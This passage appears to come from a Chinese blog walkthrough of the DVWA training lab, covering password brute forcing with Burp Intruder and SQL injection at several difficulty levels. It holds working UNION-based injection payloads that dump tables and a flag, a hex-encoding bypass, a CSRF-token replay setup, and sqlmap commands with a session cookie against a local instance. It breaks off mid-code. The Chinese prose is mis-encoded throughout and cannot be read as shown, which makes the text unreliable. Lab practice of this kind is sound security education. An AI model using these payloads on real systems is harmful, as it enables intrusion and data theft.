è¿™ç§æ¨¡å¼ä¼šä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­æœ‰ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šè¿­ä»£æ¯ä¸ªpayloadç»„ï¼Œæ¯ç§payloadç»„åˆéƒ½ä¼šè¢«æµ‹è¯•ä¸€éã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™ä¸¤ä¸ªå­—å…¸å°†ä¼šå¾ªç¯æ­é…ç»„åˆè¿›è¡Œattackå¤„ç†è¿™ç§æ”»å‡»é€‚ç”¨äºé‚£ç§ä½ç½®ä¸­éœ€è¦ä¸åŒä¸”ä¸ç›¸å…³æˆ–è€…æœªçŸ¥çš„è¾“å…¥çš„æ”»å‡»ã€‚æ”»å‡»è¯·æ±‚çš„æ€»æ•°æ˜¯å„payloadç»„ä¸­payloadæ•°é‡çš„ä¹˜ç§¯ã€‚</p><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>1.æŠ“åŒ…â€“&gt;ctrl+I â€“&gt;æ ‡è®°è¦çˆ†ç ´çš„å‚æ•°ï¼Œè¿™é‡Œç›´æ¥çˆ†ç ´password</p><p><img src="https://i.loli.net/2020/11/26/pEXImJf8eL1R7xq.png" alt="int1.png"></p><p>2.é€‰æ‹©è¦åŠ è½½çš„å¯†ç å­—å…¸ï¼Œå¯ä»¥ä½¿ç”¨è‡ªå·±å‡†å¤‡çš„å¯†ç å­—å…¸ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨bpè‡ªå¸¦çš„å¯†ç å­—å…¸ï¼Œä½†æ˜¯æœ€é‡è¦çš„æ˜¯è¦åŒ…å«æ­£ç¡®è¾¾åˆ°å¯†ç </p><p><img src="https://i.loli.net/2020/11/26/7hkFZm134qy8auw.png" alt="int3.png"></p><p><img src="https://i.loli.net/2020/11/26/SY9gXKPaRDoJ16k.png" alt="int2.png"></p><p>3.å¼€å§‹çˆ†ç ´ ï¼Œæ ¹æ®å“åº”åŒ…çš„é•¿åº¦ç­›é€‰å‡ºæ­£ç¡®å¯†ç çš„å“åº”åŒ…ï¼Œè¿™é‡Œåªæœ‰å½“å¯†ç ä¸ºpasswordçš„æ—¶å€™å“åº”åŒ…çš„é•¿åº¦ä¸º4743,æ‰€ä»¥passwordå°±æ˜¯äº‰å–å¯†ç ã€‚</p><p><img src="https://i.loli.net/2020/11/26/GOsWwrvcobAxEpV.png" alt="int4.png"></p><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;    <span class="hljs-comment">// Sanitise username input</span>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));    <span class="hljs-comment">// Sanitise password input</span>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));    <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );    <span class="hljs-comment">// Check the database</span>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;        <span class="hljs-comment">// Get users details</span>        <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];        <span class="hljs-comment">// Login successful</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-comment">// Login failed</span>        sleep( <span class="hljs-number">2</span> );        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;    &#125;    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ä¸lowçº§åˆ«ç›¸æ¯”è¾ƒï¼Œåªæ˜¯å¢åŠ äº†å›æ˜¾çš„æ—¶é—´ï¼Œæ‰€ä»¥è¿˜æ˜¯å¯ä»¥ä½¿ç”¨lowçº§åˆ«çš„æ–¹æ³•ç›´æ¥çˆ†ç ´ï¼Œä¸è¿‡èŠ±è´¹çš„æ—¶é—´ç›¸å¯¹ä¼šé•¿ä¸€ç‚¹ã€‚</p><p>1.ç«ç‹æµè§ˆå™¨æ‰“å¼€ä»£ç†æŠ“åŒ…åå‘åˆ°çˆ†ç ´æ¨¡å—ï¼Œæ·»åŠ çˆ†ç ´çš„å˜é‡ã€‚</p><p>2.åŠ è½½å¯†ç å­—å…¸è¿›è¡Œçˆ†ç ´ã€‚</p><p>3.æ ¹æ®å“åº”åŒ…çš„é•¿åº¦ç¡®å®šæ­£ç¡®å¯†ç ã€‚</p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;    <span class="hljs-comment">// Check Anti-CSRF token</span>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );    <span class="hljs-comment">// Sanitise username input</span>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];    <span class="hljs-variable">$user</span> = stripslashes( <span class="hljs-variable">$user</span> );    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));    <span class="hljs-comment">// Sanitise password input</span>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];    <span class="hljs-variable">$pass</span> = stripslashes( <span class="hljs-variable">$pass</span> );    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));    <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );    <span class="hljs-comment">// Check database</span>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;        <span class="hljs-comment">// Get users details</span>        <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );        <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];        <span class="hljs-comment">// Login successful</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-comment">// Login failed</span>        sleep( rand( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;    &#125;    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);&#125;<span class="hljs-comment">// Generate Anti-CSRF token</span>generateSessionToken();<span class="hljs-meta">?&gt;</span></code></pre><p>å®¡è®¡ä»£ç åå¯ä»¥å‘ç°ä½¿ç”¨äº†éšæœºtokenæœºåˆ¶æ¥é˜²æ­¢CSRFï¼Œä»è€Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢äº†é‡æ”¾æ”»å‡»ï¼Œå¢åŠ äº†çˆ†ç ´éš¾åº¦ï¼Œä½†æ˜¯ä»»ç„¶å¯ä»¥ä½¿ç”¨bpçš„çˆ†ç ´æ¨¡å—</p><p>1.æŠ“åŒ…ï¼Œå‘åŒ…åˆ°çˆ†ç ´æ¨¡å—å¹¶æ·»åŠ å‚æ•°ï¼Œè¿™æ¬¡éœ€è¦æ·»åŠ ä¸¤ä¸ªå‚æ•°ï¼Œè®¾ç½® passwordå’Œuser_tokenä¸ºå˜é‡</p><p><img src="https://i.loli.net/2020/11/05/WFYoqKklaEOwHtn.png" alt="intr3-1.png"></p><p>2.æ”»å‡»ç±»å‹é€‰æ‹©pitchforkï¼Œæ„æ€æ˜¯è‰å‰æ¨¡å¼ï¼ˆPitchfork ï¼‰â€”â€”å®ƒå¯ä»¥ä½¿ç”¨å¤šç»„Payloadé›†åˆï¼Œåœ¨æ¯ä¸€ä¸ªä¸åŒçš„Payloadæ ‡å¿—ä½ç½®ä¸Šï¼ˆæœ€å¤š20ä¸ªï¼‰ï¼Œéå†æ‰€æœ‰çš„Payloadã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªPayloadæ ‡å¿—ä½ç½®ï¼Œç¬¬ä¸€ä¸ªPayloadå€¼ä¸ºAå’ŒBï¼Œç¬¬äºŒä¸ªPayloadå€¼ä¸ºCå’ŒDï¼Œåˆ™å‘èµ·æ”»å‡»æ—¶ï¼Œå°†å…±å‘èµ·ä¸¤æ¬¡æ”»å‡»ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºAå’ŒCï¼Œç¬¬äºŒæ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºBå’ŒDã€‚</p><p><img src="https://i.loli.net/2020/11/05/tr4dB1SzEHxY9UD.png" alt="intr3-2.png"></p><p>3.è®¾ç½®å‚æ•°ï¼Œåœ¨optioné€‰é¡¹å¡ä¸­å°†æ”»å‡»çº¿ç¨‹threadè®¾ç½®ä¸º1ï¼Œå› ä¸ºRecursive_Grepæ¨¡å¼ä¸æ”¯æŒå¤šçº¿ç¨‹æ”»å‡»ï¼Œç„¶åé€‰æ‹©Grep-Extractï¼Œæ„æ€æ˜¯ç”¨äºæå–å“åº”æ¶ˆæ¯ä¸­çš„æœ‰ç”¨ä¿¡æ¯ï¼Œç‚¹å‡»Addï¼Œå¦‚ä¸‹å›¾è¿›è¡Œè®¾ç½®ï¼Œæœ€åå°†Redirectionsè®¾ç½®ä¸ºAlways</p><p><img src="https://i.loli.net/2020/11/05/d5qmsRVpu3kZ7Gr.png" alt="intr3-3.png"></p><p>4.è®¾ç½®payloadï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯†ç ä¸ä¹‹å‰ä¸¤æ¬¡ä¸€æ ·ï¼ŒåŠ è½½å¯†ç å­—å…¸å³å¯ï¼Œç¬¬äºŒtokenå‚æ•°é€‰æ‹©Recursive grepï¼Œç„¶åå°†optionsä¸­çš„tokenä½œä¸ºç¬¬ä¸€æ¬¡è¯·æ±‚çš„åˆå§‹å€¼ã€‚</p><p><img src="https://i.loli.net/2020/11/05/cQdZAUqgMDO4eJI.png" alt="intr3-4.png"></p><p>5.start attack,è¿˜æ˜¯æ ¹æ®å“åº”åŒ…é•¿åº¦çš„ä¸åŒæ‰¾åˆ°åŒ…å«çœŸæ­£å¯†ç çš„è¯·æ±‚åŒ…ï¼Œè·å–æ­£ç¡®å¯†ç ã€‚</p><p><img src="https://i.loli.net/2020/11/05/tpMjbBah95clPK8.png" alt="intr3-5.png"></p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span> [ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];    <span class="hljs-comment">// Check database</span>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );    <span class="hljs-comment">// Get results</span>    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;        <span class="hljs-comment">// Get values</span>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];        <span class="hljs-comment">// Feedback for end user</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;    &#125;    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        &#125;<span class="hljs-meta">?&gt;</span></code></pre><p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;</code>æ³¨å…¥ç‚¹å°±åœ¨è¿™å¥ä»£ç ä¸­</p><h4 id="æ‰‹å·¥æ³¨å…¥"><a href="#æ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h4><h5 id="1-åˆ¤æ–­æ³¨å…¥ç±»å‹"><a href="#1-åˆ¤æ–­æ³¨å…¥ç±»å‹" class="headerlink" title="1.åˆ¤æ–­æ³¨å…¥ç±»å‹"></a>1.åˆ¤æ–­æ³¨å…¥ç±»å‹</h5><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<span class="hljs-number">1</span><span class="hljs-comment">&#x27; or 1=1 #</span></code></pre><p>å¯çŸ¥æ˜¯å­—ç¬¦å‹æ³¨å…¥</p><h5 id="2-åˆ¤æ–­å¤šå°‘å­—æ®µæ•°"><a href="#2-åˆ¤æ–­å¤šå°‘å­—æ®µæ•°" class="headerlink" title="2.åˆ¤æ–­å¤šå°‘å­—æ®µæ•°"></a>2.åˆ¤æ–­å¤šå°‘å­—æ®µæ•°</h5><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">#</span></code></pre><p>æŠ¥é”™</p><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment">#</span></code></pre><p>æ˜¾ç¤ºæ­£å¸¸ï¼Œè¯´æ˜åªæœ‰2ä¸ªå­—æ®µ</p><h5 id="3-ç¡®è®¤æ˜¾ç¤ºé¡ºåº"><a href="#3-ç¡®è®¤æ˜¾ç¤ºé¡ºåº" class="headerlink" title="3.ç¡®è®¤æ˜¾ç¤ºé¡ºåº"></a>3.ç¡®è®¤æ˜¾ç¤ºé¡ºåº</h5><p><img src="https://i.loli.net/2020/11/06/isw8SKDdjWlv5AJ.png" alt="sqll-2.png"></p><p>ä¸¤ä¸ªä½ç½®éƒ½å¯ä»¥ä½¿ç”¨</p><h5 id="4-unionæŸ¥è¯¢"><a href="#4-unionæŸ¥è¯¢" class="headerlink" title="4.unionæŸ¥è¯¢"></a>4.unionæŸ¥è¯¢</h5><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()#</code></pre><p><img src="https://i.loli.net/2020/11/06/mudnW957ZotUhNM.png" alt="sqll-3.png"></p><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-meta">#</span></code></pre><p><img src="https://i.loli.net/2020/11/06/UtxVjBMkiGb534Z.png" alt="sqll-4.png"></p><pre><code class="hljs capnproto"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#</span></code></pre><p><img src="https://i.loli.net/2020/11/06/BNp8ZiPgy2MdHvC.png" alt="sqll-1.png"></p><h4 id="sqlmapæ³¨å…¥"><a href="#sqlmapæ³¨å…¥" class="headerlink" title="sqlmapæ³¨å…¥"></a>sqlmapæ³¨å…¥</h4><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--dbs</span>python2 sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-params">--batch</span> -D dvwa -T flag <span class="hljs-params">--columns</span>python2 sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-params">--batch</span> -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span></code></pre><p><img src="https://i.loli.net/2020/11/06/f87DeH6rKI2JhzY.png" alt="sqll-5.png"></p><h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>ä¸lowçº§åˆ«ç›¸æ¯”è¾ƒï¼Œè¿™é‡Œçš„idå€¼ä¸éœ€è¦ç”¨æˆ·è¾“å…¥ï¼Œåªéœ€è¦é€‰æ‹©ï¼Œä½†æ˜¯å¯ä»¥æŠ“åŒ…ä¿®æ”¹idçš„å†…å®¹</p><p><img src="https://i.loli.net/2020/11/05/VTtp9QbyDe1Gsg8.png" alt="sqlm-1.png"></p><h4 id="æ‰‹å·¥æ³¨å…¥-1"><a href="#æ‰‹å·¥æ³¨å…¥-1" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h4><p>ç»è¿‡æµ‹è¯•æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œå¾ˆç®€å•çš„åˆ¤æ–­å°±ä¸æˆªå›¾äº†</p><h5 id="1-åˆ¤æ–­åˆ—æ•°"><a href="#1-åˆ¤æ–­åˆ—æ•°" class="headerlink" title="1.åˆ¤æ–­åˆ—æ•°"></a>1.åˆ¤æ–­åˆ—æ•°</h5><pre><code class="hljs crmsh"><span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-comment">#&amp;Submit=Submit</span></code></pre><p><img src="https://i.loli.net/2020/11/05/GuUbcedZETzJ7qw.png" alt="sqlm-2.png"></p><p>æ­¤æ—¶é¡µé¢æ­£å¸¸</p><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#&amp;Submit=Submit</code></pre><p>æ­¤æ—¶é¡µé¢æŠ¥é”™</p><p><code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code></p><p>æ‰€ä»¥å¯çŸ¥ä¸ºä¸¤åˆ—ï¼Œä¹‹åçš„æ“ä½œä¸lowçº§åˆ«çš„ä¸€æ ·</p><h5 id="2-unionæŸ¥è¯¢"><a href="#2-unionæŸ¥è¯¢" class="headerlink" title="2.unionæŸ¥è¯¢"></a>2.unionæŸ¥è¯¢</h5><pre><code class="hljs pgsql">çˆ†æ•°æ®åº“åid=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()#&amp;Submit=Submitçˆ†åˆ—åid=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x666c6167</span> #&amp;Submit=Submitè¯»å–flagid=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(fl4g) <span class="hljs-keyword">from</span> flag #&amp;Submit=Submit</code></pre><p>è¿™é‡Œè¯»å–åˆ—åçš„æ—¶å€™éœ€è¦æ³¨æ„ä½¿ç”¨åˆ—åçš„åå…­è¿›åˆ¶ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™ï¼Œåº”è¯¥æ˜¯ <code>&#39;</code>è¢« <code>\</code>è½¬ä¹‰äº†ï¼Œå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡</p><p><img src="https://i.loli.net/2020/11/05/OlNHhc4Zy9KnsYS.png" alt="sqlm-3.png"></p><p><img src="https://i.loli.net/2020/11/05/zM1eE3plignbySf.png" alt="sqlm-4.png"></p><p><strong>åˆ†ææºç </strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];    <span class="hljs-variable">$id</span> = mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$id</span>);    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;    <span class="hljs-variable">$result</span> 